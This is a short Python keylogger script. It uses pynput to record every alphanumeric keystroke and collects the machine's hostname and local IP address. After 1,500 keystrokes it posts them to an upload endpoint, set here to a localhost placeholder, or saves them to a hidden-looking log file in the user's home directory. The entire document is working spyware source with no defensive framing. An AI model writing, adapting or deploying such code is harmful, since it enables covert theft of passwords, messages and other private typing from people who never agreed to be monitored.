from pynput import keyboard
import requests, platform, socket, os


key_strokes = []
OPERATING_MODE = 1 # 0: local file save mode, 1: remote API send mode
FILE_SAVE_LOCATION = os.path.expanduser('~') + '/tmp.log'
HOSTNAME = socket.gethostname()
LOCAL_IP_ADDRESS = socket.gethostbyname(HOSTNAME)
API = f'https://localhost/upload_log'


def on_press(key):
    try:
        print('alphanumeric key {0} pressed'.format(
            key.char))
        key_strokes.append(key.char)
    except AttributeError:
        print('special key {0} pressed'.format(
            key))


def get_json():
    return {
        "key_strokes": key_strokes,
        "hostname": HOSTNAME,
        "ip_address": LOCAL_IP_ADDRESS,
    }


def main():
    # ...or, in a non-blocking fashion:
    with keyboard.Listener(
            on_press=on_press) as listener:
        listener.join()
        if len(key_strokes) >= 1500:
            if OPERATING_MODE == 1:
                requests.post(API, data=get_json())
            else:
                with open(FILE_SAVE_LOCATION, 'w') as f:
                    f.write('\n'.join(key_strokes))


if __name__ == '__main__':
    main()
